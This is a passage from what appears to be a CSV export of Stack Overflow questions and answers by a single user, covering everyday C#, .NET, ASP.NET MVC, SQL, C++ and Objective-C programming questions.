","33708","","<p>No, it's not. You are just declaring a type that's scoped inside another one. If you also had it as a field of the enclosing type then it would have been considered composition like:</p>

<pre><code>class Book
{
   private class Chapter
   {
   }

   private Chapter ChapterOne; // a field; actual usage of Chapter type
}
</code></pre>

<p>Note that it doesn't matter a bit that the <code>Chapter</code> class is a nested type or not. What matters is the usage of some type as a field inside another.</p>
"
"<pre><code>Dim objMail As New Mail.MailMessage(""no-reply@mywebsite.com"", ToEmail, ""Password Reset"", body)
</code></pre>

<p>...and the problem is that the message is sent as pure text including the <code>&lt;br&gt;</code> tags within the body</p>

<p>How could i send the email as html?</p>
","33708","","<p>Easy:</p>

<pre><code>objMail.IsBodyHtml = True
</code></pre>
"
"<p>I'm working my way through some ASP.NET MVC reading and I have a web app at work that I'll be migrating from WebForms to MVC.  One of the feature requests I expect to get in the process is to have a simplified view returned if the user is coming from a mobile device.  </p>

<p>I can't quite see where the best place is to implement that type of logic. I'm sure there's a better way than adding an if/else for Browser.IsMobileDevice in every action that returns a view. What kind of options would I have to do this?</p>
","33708","","<p>In the Model-View-Controller pattern, it's the controller that chooses view, so, it's not that bad to add an <code>if</code> statement and return an appropriate view. You can encapsulate the <code>if</code> statement in a method and call it:</p>

<pre><code>return AdaptedView(Browser.IsMobileDevice, ""MyView.aspx"", model);
</code></pre>

<p>Alternatively, you can create a view engine that dynamically executes a view based on whether it's mobile or not. I'm not a fan of this approach since I believe the controller should be in charge. For instance, if you're browsing on iPhone, you might want to see the full desktop version instead. In the former approach, you'd pass the appropriate boolean flag but in the latter, things become more complicated.</p>
"
"<p>I have a GUI program, which would call a cmd in this GUI program. In my case, the GUI call the robocopy to copy the file to a file server.And I want to show the progress in the GUI. So how can I get the output of the robocopy and display it on my GUI.</p>

<p>Best Regards,
Yongwei Xing</p>
","33708","","<p>Use the <a href=""http://msdn.microsoft.com/en-us/library/system.diagnostics.process.standardoutput.aspx"" rel=""nofollow""><code>StandardOutput</code></a> stream:</p>

<pre><code>process.StartInfo.UseShellExecute = false;
process.StartInfo.RedirectStandardOutput = true;

// ...
// read from process.StandardOutput
</code></pre>

<p>Alternatively, rather than reading from <code>StandardOutput</code> directly, you can call <a href=""http://msdn.microsoft.com/en-us/library/system.diagnostics.process.beginoutputreadline.aspx"" rel=""nofollow""><code>BeginOutputReadLine</code></a> passing a callback that will tell you whenever a new line is outputted.</p>
"
"<p>HI,</p>

<p>I have a ASP.NET webiste I created from craft and it now look a big mess. I want to reorganize this but don't know the good way to do it. Some first look well but later cause trouble with master page, image path...</p>

<p>Now I'm thinking of 2 ways:</p>

<ul>
<li>Using UrlWriter: but it seems lead to a bulk of path rewrite and usually lead to Resource not found or something</li>
<li>Using a page as main entry and using Server.Tranfer to pull the right page content, despite of its location</li>
</ul>

<p>Which is better? Do you have another method?</p>

<p>Please help!</p>
","33708","","<p>There's another approach, <code>System.Web.Routing</code>, added in ASP.NET 3.5 SP1. Basically, you implement the <a href=""http://msdn.microsoft.com/en-us/library/system.web.routing.iroutehandler.aspx"" rel=""nofollow""><code>IRouteHandler</code></a> interface and manually route the request to an appropriate handler.</p>

<p>This is how ASP.NET MVC handles request routing. There's a <a href=""http://blogs.msdn.com/mikeormond/archive/2008/05/14/using-asp-net-routing-independent-of-mvc.aspx"" rel=""nofollow"">guide here that uses it for Web forms</a>.</p>

<p>By the way, consider looking at ASP.NET MVC and check if it's appropriate for your situation. </p>
"
"<p>Most of my company's web programming background is PHP, so ASP.NET MVC was a logical choice for our newest web application that also needed to work as a back-end to a separate Winforms app.  However, we keep finding ourselves going down the road we typically followed in php - echoing lots of tags for conditional output.  Is this a bad idea in ASP.NET MVC?</p>

<p>For example, without Response.Write:</p>

<pre><code>      &lt;%if (OurUserSession.IsMultiAccount)
        {%&gt;
        &lt;%=Html.ActionLink(""SwitchAccount"", ""Accounts"", ""Login"") %&gt;&lt;span&gt;|&lt;/span&gt;
      &lt;%}%&gt;
</code></pre>

<p>With Response.Write:</p>

<pre><code>      &lt;%if (OurUserSession.IsMultiAccount)
          Response.Write (Html.ActionLink(""Swith Account"", ""Accounts"", ""Login"") + ""&lt;span&gt;|&lt;/span&gt;"");
      %&gt;
</code></pre>

<p>The difference is rather minor here, but sometimes our view logic gets more complex (very complex view logic, i.e. anything more than booleans, we just offload to the controller).  The second seems easier to read, but I wanted to see if there were any thoughts on the matter.</p>
","33708","","<p>Nope. It's not a bad idea. Functionally, those snippets are equivalent. Go with the most readable in your specific case.</p>
"
"<p>Extract from CLR via C# on Boxing / Unboxing value types ...</p>

<p>On Boxing: If the nullable instance is not <strong>null</strong>, the CLR takes the value out of the nullable instance and boxes it. In other words a <strong>Nullable &lt; Int32 ></strong> with a value of <strong>5</strong> is boxed into a <strong>boxed-Int32</strong> with a value of 5.</p>

<p>On Unboxing: Unboxing is simply the act of obtaining a reference to the unboxed portion of a boxed object. The problem is that a boxed value type cannot be simply unboxed  into a nullable version of that value type because the boxed value doesn't have the <strong>boolean hasValue</strong> field in it. So, when unboxing a value type into a nullable version, the CLR must allocate a <strong>Nullable &lt; T ></strong> object, initialize the <strong>hasValue</strong> field to <strong>true</strong>, and set the <strong>value</strong> field to the same value that is in the boxed value type. This impacts your application performance (memory allocation during unboxing).</p>

<p><strong>Why did the CLR team go through so much trouble for Nullable types  ? Why was it not simply boxed into a Nullable &lt; Int32 > in the first place ?</strong> </p>
","33708","","<p>I remember this behavior was kind of last minute change. In early betas of .NET 2.0, <code>Nullable&lt;T&gt;</code> was a ""normal"" value type. Boxing a <code>null</code> valued <code>int?</code> turned it into a boxed <code>int?</code> with a boolean flag. I think the reason they decided to choose the current approach is consistency. Say:</p>

<pre><code>int? test = null;
object obj = test;
if (test != null)
   Console.WriteLine(""test is not null"");
if (obj != null)
   Console.WriteLine(""obj is not null"");
</code></pre>

<p>In the former approach (box <code>null</code> -> boxed <code>Nullable&lt;T&gt;</code>), you wouldn't get ""test is not null"" but you'd get ""object is not null"" which is weird. </p>

<p>Additionally, if they had boxed a nullable value to a <code>boxed-Nullable&lt;T&gt;</code>:</p>

<pre><code>int? val = 42;
object obj = val;

if (obj != null) {
   // Our object is not null, so intuitively it's an `int` value:
   int x = (int)obj; // ...but this would have failed. 
}
</code></pre>

<p>Beside that, I believe the current behavior makes perfect sense for scenarios like nullable database values (think SQL-CLR...)</p>

<p><hr /></p>

<h3>Clarification:</h3>

<p>The whole point of providing nullable types is to make it easy to deal with variables that have no meaningful value. They didn't want to provide two distinct, unrelated types. An <code>int?</code> should behaved more or less like a simple <code>int</code>. That's why C# provides lifted operators. </p>

<blockquote>
  <p>So, when unboxing a value type into a nullable version, the CLR must allocate a <code>Nullable&lt;T&gt;</code> object, initialize the hasValue field to true, and set the value field to the same value that is in the boxed value type. This impacts your application performance (memory allocation during unboxing).</p>
</blockquote>

<p>This is not true. The CLR would have to allocates memory <strong>on stack</strong> to hold the variable whether or not it's nullable. There's not a performance issue to allocate space for an extra boolean variable.</p>
"
"<p>I want to install SQL Server 2008 Enterprise Edition to Windows 7 Professional Edition. I tried many times, but it also failed. Is it possible to do that?</p>

<p>Anyone has successful to install on this case?</p>

<p>Best regards,
On</p>
","33708","","<p>SQL Server Enterprise Edition does not support Windows client operating systems. You can only install it on Windows Server.</p>

<p>Try installing Developer Edition. It provides similar features with licensing restrictions (you can't install it on production servers).</p>
"
"<p>what are the benefits of implementing an interface in C# 3.5 ?</p>
","33708","","<p>You'll be able to pass your object to a method (or satisfy a type constraint) that expects the interface as an argument. C# does not support ""<a href=""http://en.wikipedia.org/wiki/Duck%5Ftyping"">duck typing</a>."" Just by writing the methods defined by the interface, the object will not automatically be ""compatible"" with the interface type:</p>

<pre><code>public void PrintCollection&lt;T&gt;(IEnumerable&lt;T&gt; collection) {
    foreach (var x in collection)
       Console.WriteLine(x);
}
</code></pre>

<p>If <code>List&lt;T&gt;</code> did not implement the <code>IEnumerable&lt;T&gt;</code> interface, you wouldn't be able to pass it as an argument to <code>PrintCollection</code> method (even if it had a <code>GetEnumerator</code> method).</p>

<p>Basically, an interface declares a contract. Implementing an interface enforces your class to be bound to the contract (by providing the appropriate members). Consequently, everything that relies on that contract (a method that relies on the functionality specified by the interface to be provided by your object) can work with your object too.</p>
"
"<p>I have the following code:  </p>

<pre><code>public List&lt;IWFResourceInstance&gt; FindStepsByType(IWFResource res)  
{  
    List&lt;IWFResourceInstance&gt; retval = new List&lt;IWFResourceInstance&gt;();  
    this.FoundStep += delegate(object sender, WalkerStepEventArgs e)   
                      {   
                        if (e.Step.ResourceType == res) retval.Add(e.Step);   
                      };  
    this.Start();  
    return retval;
}  
</code></pre>

<p>Notice how I register my event member (FoundStep) to local in-place anonymous function.</p>

<p>My question is: when the function 'FindStepByType' will end - will the anonymous function be removed automatically from the delegate list of the event or I have to manually remove it before steping out the function? (and how do I do that?)</p>

<p>I hope my question was clear. </p>
","33708","","<p>No, it will not be removed automatically. In this sense, there's not a difference between an anonymous method and a ""normal"" method. If you want, you should manually unsubscribe from the event.</p>

<p>Actually, it'll capture other variables (e.g. <code>res</code> in your example) and keep them alive (prevents garbage collector from collecting them) too. </p>
"
"<p>Say my base method looks like:</p>

<pre><code>public int GetCount() {.....}
</code></pre>

<p>Now I inherit from GetCount's class, and do:</p>

<pre><code>public new int GetCount()
{
  int count = base.GetCount();

  count += 1;


  return count;

}
</code></pre>

<p>Will calling base.GetCount() cause a return before my increment? (that seems to be what I am experiencing)</p>
","33708","","<p>No, why it should return? There's no return statement there. Make sure you are not mistakenly calling the base method. Probably showing us the code that calls it helps. If you are calling it like:</p>

<pre><code>Base b = new Derived();
int result = b.GetCount();
</code></pre>

<p>you are calling the base method.</p>
"
"<p>Let us assume I have declared the variable 'i' of certain datatype (might be int, char, float or double) ... </p>

<p><strong>NOTE:</strong> Simply consider that 'i' is declared and dont bother if it is an int or char or float or double datatype. Since I want a generic solution I am simply mentioning that variable 'i' can be of any one of the datatypes namely int, char, float or double.</p>

<p>Now can I find the size of the variable 'i' without sizeof operator?</p>
","33708","","<p>Look up the documentation for the compiler.</p>
"
"<p>for instance a very simple method:</p>

<pre><code>private int GetCount(ITable table) {

  return (from T in table select T).Count();
}
</code></pre>
","33708","","<p>You mean something like this?</p>

<pre><code>private int GetCount&lt;T&gt;(IQueryable&lt;T&gt; table) {
   // return (from T in table select T).Count();
   return table.Count();
}
</code></pre>

<p>Why don't you call <code>Count()</code> directly on the object, by the way?</p>
"
"<pre><code>@""F:\LEAFPRODUCT\Bin\Service.exe""
</code></pre>

<p>This is the physical path of <code>Service.exe</code>, let me know is there any other alternate way or any general way to find the physical path of <code>WrmService.exe</code> in window application.</p>

<p>In a web application we can use <code>Server.MapPath</code> like that. Here I need to reduce path means</p>

<pre><code>label1.Text = AssemblyName.GetAssemblyName(@""F:\LEAFPRODUCT\Bin\Service.exe"").Version.ToString();
</code></pre>

<p>This is my coding I need to reduce the physical path here, means I don't want to put all the folders I need this way only</p>

<pre><code>label1.Text = AssemblyName.GetAssemblyName(""WrmService.exe"").Version.ToString();
</code></pre>

<p>means only the required file name here means <code>WrmService.exe</code></p>
","33708","","<p>You want the physical path of the executable assembly?</p>

<pre><code>System.Reflection.Assembly.GetEntryAssembly().Location
</code></pre>
"
"<p>My software makes heavy use of COM. It is very, very slow. Is there some trick to speeding COM communication up?</p>
","33708","","<p>If you're not already doing that, run the component in-process rather than in a separate server process (<code>dllhost.exe</code>).</p>
"
"<blockquote>
  <p><strong>Possible Duplicates:</strong><br />
  <a href=""http://stackoverflow.com/questions/197047/what-is-the-difference-between-and"">What is the difference between &lt;% %&gt; and &lt;%=%&gt;?</a><br />
  <a href=""http://stackoverflow.com/questions/942166/c-mvc-what-is-the-difference-between-and"">C# MVC: What is the difference between &lt;%# and &lt;%=</a>  </p>
</blockquote>

<p>I'm so confused with this.</p>

<p>Please explain the difference between this if possible..</p>

<p>What is the significance of that ""="" there?</p>

<p>Edit:Thanks for all your answers.Please understand that It was hard to get any results by searching for ""&lt;%="" on google and on the search bar in stackoverflow as well.</p>
","33708","","<p><code>&lt;% %&gt;</code> is a generic code block.</p>

<p><code>&lt;%= expression %&gt;</code> is equivalent to <code>&lt;% Response.Write(expression); %&gt;</code>.</p>
"
"<p>If you are multi-targeting an assembly how should you name the files?</p>

<p>For example if you are targeting both standard .net and silverlight should the files be named differently?</p>

<p>Something like MyProject.dll and MyProject.Silverlight.dll</p>

<p>Or should they be named the same but exist in different directories</p>

<p>Something like DotNet\MyProject.dll and Silverlight\MyProject.dll</p>

<p>Thanks</p>

<p>Edit: Both RhinoMocks and Prism use the "".Silverlight"" approach</p>
","33708","","<p>I prefer to make them have identical names. After all, it's essentially the same assembly, content-wise. This way, it's easier to mix and match stuff just by replacing the assembly file and not changing build scripts.</p>
"
"<p>I have a private class variable that holds a collection of order items:</p>

<pre><code>Private _Items As New System.Collections.Generic.SortedList(Of Integer, OrderItem)
</code></pre>

<p>What I'm trying to do it Get and Set a subset of the items through a Property on the class using the .Where() extension method of IEnumerable (I think). Something along the lines of:</p>

<pre><code>Public Property StandardItems() As SortedList(Of Integer, OrderItem)
    Get
        Return _Items.Where(Function(ItemID As Integer, Item As OrderItem) Item.ItemType = ""SomeValue"")
    End Get
    Set(ByVal value As SortedList(Of Integer, OrderItem))
        _Items = value
    End Set
End Property
</code></pre>

<p>Is this possible? If so, how would I implement it? I'm not having much luck with MSDN docs, Visual Studio intellisense or trial and error.</p>
","33708","","<p>The <code>Where</code> extension method returns an <code>IEnumerable(Of KeyValuePair(Of Integer, OrderItem))</code>. You can change the type of your property to it.</p>

<p>If you need to return a sorted list, you'll have to create that manually from the output of <code>Where</code> method:</p>

<pre><code>Dim whereQuery = ...
Return New SortedList(Of Integer, OrderItem)(whereQuery _
                      .ToDictionary(Function(x) x.Key, Function(x) x.Value))
</code></pre>

<p>I'm a little worried about how your setter behave. Do you want to replace your whole sorted list through the property? It's name says it's just standard items (a filtered set of items) but setting it would change all items.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/5037470/cross-thread-operation-not-valid"">Cross-thread operation not valid</a>  </p>
</blockquote>



<p>I am trying to close the base of a form from another thread. I am getting the following error.</p>

<blockquote>
  <p>System.InvalidOperationException: Cross-thread operation not valid: Control 'MDIParent' accessed from a thread other than the thread it was created on.</p>
</blockquote>

<p>for the below line:</p>

<pre><code>MDIParent.MDIParentRef.BaseClose();
</code></pre>
","33708","","<p>You need to perform the operation on the UI Thread:</p>

<pre><code>if (InvokeRequired) 
    Invoke(new Action(MDIParent.MDIParentRef.BaseClose));
else
    MDIParent.MDIParentRef.BaseClose();
</code></pre>
"
"<p>What is the purpose of naming your constraints (unique, primary key, foreign key)?</p>

<p>Say I have a table which is using natural keys as a primary key:</p>

<pre><code>CREATE TABLE Order
(
    LoginName        VARCHAR(50)    NOT NULL,
    ProductName      VARCHAR(50)    NOT NULL,
    NumberOrdered    INT            NOT NULL,
    OrderDateTime    DATETIME       NOT NULL,
    PRIMARY KEY(LoginName, OrderDateTime)
);
</code></pre>

<p>What benefits (if any) does naming my PK bring?</p>

<p>Eg.
Replace:</p>

<pre><code>    PRIMARY KEY(LoginName, OrderDateTime)
</code></pre>

<p>With:</p>

<pre><code>    CONSTRAINT Order_PK PRIMARY KEY(LoginName, OrderDateTime)
</code></pre>

<p>Sorry if my data model is not the best, I'm new to this!</p>
","33708","","<p>To identify the constraint in the future (e.g. you want to drop it in the future), it should have a unique name. If you don't specify a name for it, the database engine will probably assign a weird name (e.g. containing random stuff to ensure uniqueness) for you.</p>
"
"<p>I have this situation:</p>

<pre><code>{
    float foo[10];
    for (int i = 0; i &lt; 10; i++) {
         foo[i] = 1.0f;
    }
    object.function1(foo); // stores the float pointer to a const void* member of object
}
object.function2(); // uses the stored void pointer
</code></pre>

<p>Are the contents of the float pointer unknown in the second function call? It seems that I get weird results when I run my program. But if I declare the float foo[10] to be const and initialize it in the declaration, I get correct results. Why is this happening?</p>
","33708","","<p>It's undefined behavior in both cases. You should consider the stack based variable deallocated when control leaves the block.</p>
"
"<p>I understand how the ""new"" keyword can hide methods in a derived class. However, what implications does it have for classes that implement interfaces that use the keyword?</p>

<p>Consider this example, where I decide to expand an interface by making its properties read/write.</p>

<pre><code>public interface IReadOnly {

   string Id {
      get;
   }
}

public interface ICanReadAndWrite : IReadOnly  {

   new string Id {
      get;
      set;
   }
}
</code></pre>

<p>Then you are able to do things like this:</p>

<pre><code>public IReadOnly SomeMethod() {
   // return an instance of ICanReadAndWrite
}
</code></pre>

<p>Is this bad design?  Will it cause issues for my classes that implement ICanReadAndWrite?</p>

<p><strong>Edit:</strong>  Here is a contrived example of <em>why</em> I might want to do something like this:</p>

<p>Say I have a factory class that returns an IShoppingCartItemReadWrite.  I can then have a service layer that manipulates prices on it, changes stuff, etc.  Then, I can pass these objects as IShoppingCartItemReadOnly to some kind of presentation layer that won't change them.  (Yes, I know it technically <em>can</em> change them-- this is a design question, not security, etc.)</p>
","33708","","<p>It's not a particularly bad idea. You should be aware that the implementor <strong>can</strong> (if it implicitly implements the interface, then a single read/write property could satisfy both interfaces) provide two distinct implementations:</p>

<pre><code>class Test : ICanReadAndWrite {
   public string Id {
      get { return ""100""; }
      set { }
   }
   string IReadOnly.Id {
      get { return ""10""; }
   }
}

Test t = new Test();
Console.WriteLine(t.Id);  // prints 100
Console.WriteLine(((IReadOnly)t).Id); // prints 10
</code></pre>

<p>By the way, in general, the <code>new</code> inheritance modifier does nothing except to tell the compiler to shut up and don't throw out a ""you're hiding that member"" warning. Omitting it will have no effect in the compiled code.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br />
  <a href=""http://stackoverflow.com/questions/39476/what-is-the-yield-keyword-used-for-in-c"">What is the yield keyword used for in C#?</a>  </p>
</blockquote>

<p>I've recently noticed the ""yield"" keyword and it caught my attention. English is not my primary language so the meaning of the word itself may elude me as well. What does that keyword mean in C# and how is it used?</p>
","33708","","<p><code>yield</code> is a contextual keyword used in iterator methods in C#. Basically, it has two use cases:</p>

<ul>
<li><code>yield return obj;</code> returns the next item in the sequence.</li>
<li><code>yield break;</code> stops returning sequence elements (this happens automatically if control reaches the end of the iterator method body).</li>
</ul>
"
"<p>If I wanted to represent states or options or something similar using binary ""flags"" so that I could pass them and store them to an object like <code>OPTION1 | OPTION2</code> where <code>OPTION1</code> is 0001 and <code>OPTION2</code> is 0010, so that what gets passed is 0011, representing a mix of the options.</p>

<p>How would I do this in C++? I was thinking something like</p>

<pre><code>enum Option {
    Option_1 = 0x01,
    Option_2 = 0x02,
    Option_3 = 0x04,
    //...
}

void doSomething(Option options) {
    //...
}

int main() {
    doSomething(Option_1|Option_2);
}
</code></pre>

<p>But then ideally, <code>doSomething</code> knows how to interpret the given Option.</p>

<p>Am I on the right track? Is there a better way? </p>

<p><strong>Update</strong></p>

<p>And wouldn't I have to define an <code>Option</code> for every possible combination, also?</p>
","33708","","<p>This is a common way these things are done. <code>doSomething</code> can use bitwise <code>and</code> operator to see if an option is selected:</p>

<pre><code>if (options &amp; Option_1){ 
  // option 1 is selected
}
</code></pre>

<p>Alternatively, you can consider using <a href=""http://msdn.microsoft.com/en-us/library/ewwyfdbe%28VS.71%29.aspx"">bit fields</a>:</p>

<pre><code>struct Options {
    unsigned char Option_1 : 1;
    unsigned char Option_2 : 1;
};

Options o;
o.Option_1 = 1;
o.Option_2 = 0;
</code></pre>
"
"<p>Is it possible to define a regex which will match every character except a certain defined character or set of characters?</p>

<p>Basically, I wanted to split a string by either comma (,) or semi-colon (;). So I was thinking of doing it with a regex which would match everything until it encountered a comma or a semi-colon.</p>
","33708","","<pre><code>[^,;]+
</code></pre>

<p>You haven't specified the regex implementation you are using. Most of them have a <code>Split</code> method that takes delimiters and split by them. You might want to use that one with a ""normal"" (without <code>^</code>) character class:</p>

<pre><code>[,;]+
</code></pre>
"
"<p>I am trying to create a generic formatter/parser combination.</p>

<p>Example scenario:</p>

<ul>
<li>I have a string for string.Format(), e.g. <code>var format = ""{0}-{1}""</code></li>
<li>I have an array of object (string) for the input, e.g. <code>var arr = new[] { ""asdf"", ""qwer"" }</code></li>
<li>I am formatting the array using the format string, e.g. <code>var res = string.Format(format, arr)</code></li>
</ul>

<p>What I am trying to do is to revert back the formatted string back into the array of object (string). Something like (pseudo code):</p>

<pre><code>var arr2 = string.Unformat(format, res)

// when: res = ""asdf-qwer""    
// arr2 should be equal to arr
</code></pre>

<p>Anyone have experience doing something like this? I'm thinking about using regular expressions (modify the original format string, and then pass it to Regex.Matches to get the array) and run it for each placeholder in the format string. Is this feasible or is there any other more efficient solution?</p>
","33708","","<p>It's simply not possible in the generic case. Some information will be ""lost"" (string boundaries) in the <code>Format</code> method. Assume:</p>

<pre><code>String.Format(""{0}-{1}"", ""hello-world"", ""stack-overflow"");
</code></pre>

<p>How would you ""Unformat"" it?</p>
"
"<p>In VB.NET, if I create a class it is a reference-type. But, if that class it chock full of value type properties, how is this handled? If the class is instantied but never filled, I suspect a pointed for to the heap is allocated. But is more space allocated on the stack for all of it's value type properties?</p>
","33708","","<p>Properties doesn't take up space by themselves. Fields do. It's not required to have a one-to-one correspondence between properties and fields.</p>

<p>Having value type fields in a reference type allocates enough memory for the whole value type whether or not you use it. It's like having all the fields in the value type defined directly in the reference type.</p>
"
"<p>I am writing a .NET application that uses cookies to store a login token.  I'd like the user to be able to log into multiple installations of this application on the same server (let's say <code>jacob.local/Devel</code> and <code>jacob.local/Stable</code>), so I want to set the Path property for the cookies appropriately.  Currently I'm using <code>Request.ApplicationPath</code> but am running into trouble when the user visits the site with a different case than what I've set up in IIS.</p>

<p>For example, the user visits <code>jacob.local/stable</code> -- the cookie's path will be <code>/Stable</code>, which the browser doesn't send back to me since it can't know that IIS is case insensitive.</p>

<p>Do I have to parse apart the whole query string myself, or is there already a function for figuring out what the path of the application is?</p>
","33708","","<p>The following trick grabs the application path with casing matched to the one specified in the URL of the current request.</p>

<pre><code>Request.Url.AbsolutePath.Remove(Request.ApplicationPath.Length)
</code></pre>
"
"<p>I'm currently writing some code for <a href=""http://code.google.com/p/unconstrained-melody/"">UnconstrainedMelody</a> which has generic methods to do with enums.</p>

<p>Now, I have a static class with a bunch of methods which are <em>only</em> meant to be used with ""flags"" enums. I can't add this as a constraint... so it's possible that they'll be called with other enum types too. In that case I'd like to throw an exception, but I'm not sure which one to throw.</p>

<p>Just to make this concrete, if I have something like this:</p>

<pre><code>// Returns a value with all bits set by any values
public static T GetBitMask&lt;T&gt;() where T : struct, IEnumConstraint
{
    if (!IsFlags&lt;T&gt;()) // This method doesn't throw
    {
        throw new ???
    }
    // Normal work here
}
</code></pre>

<p>What's the best exception to throw? <code>ArgumentException</code> sounds logical, but it's a <em>type</em> argument rather than a normal argument, which could easily confuse things. Should I introduce my own <code>TypeArgumentException</code> class? Use <code>InvalidOperationException</code>? <code>NotSupportedException</code>? Anything else?</p>

<p>I'd <em>rather</em> not create my own exception for this unless it's clearly the right thing to do.</p>
","33708","","<p>I'd go with <code>NotSupportedException</code>. While <code>ArgumentException</code> looks fine, it's really expected when an argument passed to a method is unacceptable. A type argument is a defining characteristic for the actual method you want to call, not a real ""argument."" <code>InvalidOperationException</code> should be thrown when the operation you're performing can be valid in some cases but for the particular situation, it's unacceptable.</p>

<p><code>NotSupportedException</code> is thrown when an operation is inherently unsupported. For instance, when implementing an interface where a particular member doesn't make sense for a class. This looks like a similar situation.</p>
"
"<p>I often take the classes that linq2sql generates and create a simple data-only class like so</p>

<pre><code>public class myentity
{
     public Guid id { get; set; }
     public string name { get; set; }
     // etc
}
</code></pre>

<p>I don't put methods in these classes and I mainly use them as helper classes so I can serialize to/from json and other similar actions, quite easily.  </p>

<p>My question is, should I use a struct in this case rather than a class?  </p>

<p>It seems to make sense to make it a struct as its more or less the definition of a struct, but I dont know if the performance will be ideal here since I often pass the classes around from method to method and I don't want a ton of copies since structs are value types.</p>

<p>Another thing I do quite often is use Linq2Sql's delayed execution to return my own lightweight version of the Linq2Sql classes, rather than the one they generate.  I'm not entirely sure if using a struct instead of a class would have some adverse performance impact here.</p>

<p>an example of how I'd use delayed execution is something like this</p>

<pre><code>public IEnumerable&lt;myentity&gt; getEntities()
{
     return from me in MyEntity return new myentity() { id = me.id, name = me.name };
}

public IEnumerable&lt;myentity&gt; getEntitiesThatStartWith(string s)
{
     return from me in getEntities() where me.name.StartsWith(s);
}
</code></pre>
","33708","","<p>I'd go with a <code>class</code>. A mutable <code>struct</code> is rarely a good thing. If you don't see a clear advantage of using structs instead of classes, you should avoid it. </p>

<p>Specifically, in your case, using a <code>struct</code> makes it harder for a method to modify contents of an instance (e.g. deserialize from JSON and fill some properties; you'd have to use <code>ref</code> all the time). </p>

<p>Assume <code>Entity</code> is a struct:</p>

<pre><code>List&lt;Entity&gt; entities = ...;
entities[0].Name = ""Test""; // won't compile.
</code></pre>
"
"<p>I want a way to pass some literal text to Vim.  I've seen that it can <a href=""http://www.vim.org/htmldoc/usr%5F26.html"">read from stdin</a> with the ""-"" argument, so you can pipe things to it, e.g. the output of other commands.</p>

<p>But is there a way to pass <strong>any</strong> text into it like </p>

<pre><code>vim - ""Here's some random text""
</code></pre>

<p>and open Vim with that string in the buffer? </p>

<p>It complains if I try this command...</p>
","33708","","<pre><code>echo string | vim -
</code></pre>
"
"<p>My boss has given me an assignment that I'm not sure is possible since after about two weeks, I can't figure out a solution, so I'm throwing this out to ask for any sort of help from the SO group.  If this breaks your brain, I apologize.</p>

<p>A little background first:  We develop a database querying application that allows users to get back anything they want from the database without having to know any SQL.  </p>

<p>My Problem:  We want to customize way a ""Distinct"" selection is used.  Instead of having the distinct keyword apply to the rows selected, we want it to apply to only certain fields, so that the first rows that match the fields will get used.  For an example:</p>

<p>Bob Jones, 122 Main Street, Portland, OR<br>
Sue Jones, 122 Main Street, Portland, OR<br>
Mary Smith, 458 32nd Street, Portland, OR<br>
Ralph Smith, 458 32nd Street, Portland, OR<br></p>

<p>we want this to work so that only the first rows for each address is returned as follows:</p>

<p>Bob Jones, 122 Main Street, Portland, OR<br>
Mary Smith, 458 32nd Street, Portland, OR<br></p>

<p>With the normal distinct, all four rows would be returned, which is more than we want.  Does anyone have any ideas as to how we can go about doing this?  Thanks.</p>
","33708","","<pre><code>WITH NumberedRows AS (
   SELECT FirstName, LastName, Address,
          ROW_NUMBER() OVER (PARTITION BY Address ORDER BY Id) as RowNumber
   FROM Table
) SELECT FirstName, LastName, Address
  FROM NumberedRows
  WHERE RowNumber = 1;
</code></pre>

<p><code>PARTITION BY Address</code> specifies the column list you want to group by, and <code>ORDER BY ID</code> indicates the column list you define the ""first"" item with.</p>

<p>(Make sure the previous statement is terminated by a semicolon.)</p>
"
"<p>what is this little application for?</p>

<p>When using it without any options reduces the size of the executables, but how/what it does?</p>
","33708","","<p>It strips symbol information from the binary. The binary contains some information that maps symbols (e.g. function names) to particular locations. <code>strip</code> removes those.</p>
"
"<p>After reading on stackoverflow that in the case of checking the format of a DateTime you should use DateTime.TryParse. After trying some regex expressions they seem to get long and nasty looking to cover lots of the formatting.</p>

<p>But TryParse requires an ""out"" parameter and since I just want to do a validation format check I don't need the actual result.</p>

<p>So I am left with a variable that holds the ""out"" result and am to do nothing with it. Is there a way so I don't have to do a out parameter?</p>

<p>So I get rid of this warning and stop having a variable just flying around.</p>
","33708","","<p>No. You can't get rid of the variable but you shouldn't get a compiler warning either. </p>

<p>Passing a variable as <code>out</code> is ""using"" the variable. The compiler will not issue a warning because of that.</p>
"
"<p>Can any one tell me that how to get names of all tables of a database using asp.net</p>
","33708","","<p>You didn't mention which database engine you are using. On SQL Server, you can query the <code>sysobjects</code> table and filter for objects with type <code>U</code>:</p>

<pre><code>SELECT name FROM sysobjects WHERE type = 'U'
</code></pre>
"
"<p>I came across a strange problem today. I created a subclass of UIView and added only 1 method to the template code provided by xcode.</p>

<pre><code>@interface FloatView : UIView {

}
- (void)floatTest:(CGFloat)x;
@end

- (void)floatTest:(CGFloat)x {
  NSLog(@""float was %f"", x);
}
</code></pre>

<p>Then in my appDelegate I had code like this:</p>

<pre><code>UIView *floatView = [[FloatView alloc] init];
[floatView floatTest:10.0f];
</code></pre>

<p>Pretty simple, right? What should this print out? I thought it would something like ""10.0000"", but no, it prints out ""0.000000"". </p>

<p>I wrestled with this for hours, trying to figure out what I was doing wrong, and then I changed the code in my appDelegate to </p>

<pre><code>FloatView *floatView = [[FloatView alloc] init];
[floatView floatTest:10.0f];
</code></pre>

<p>Only then, did it print out the expected ""10.0000"". Why is this so? I've declared FloatView as a subclass of UIView, shouldn't I be able to assign a FloatView object to a UIView pointer without problems?</p>

<p>Even though floatView was declared a pointer to a UIView, it's really a floatView and it should be able to handle the floatTest message? Am I totally off base here?</p>
","33708","","<p>Actually, polymorphism is working as expected. If it didn't work, nothing would have been printed (in your example, 0.0000 is being printed). The thing is, while your instance actually responds to <code>testFloat:10.0f</code> message, since the compiler can't statically see the method declaration (as <code>UIView</code> class doesn't declare such a method), it assumes that your method takes <code>...</code> as argument and returns <code>id</code>. </p>

<p>When <code>CGFloat</code> is passed to a method that expects variable number of arguments (<code>...</code>), it's promoted to <code>double</code>. Thus, the receiving method is passed a <code>double</code> argument and thinks it's a <code>float</code> and it doesn't get printed correctly. </p>

<p>You can verify this behavior by changing <code>NSLog</code> line to:</p>

<pre><code>NSLog(@""%f"", *(double*)&amp;x);
</code></pre>

<p>When the compiler sends the message to <code>FloatView*</code> rather than a <code>UIView*</code>, it can find the exact signature of the method. It can see it really expects <code>CGFloat</code> and doesn't promote the argument to <code>double</code>. As a result, it works correctly. </p>

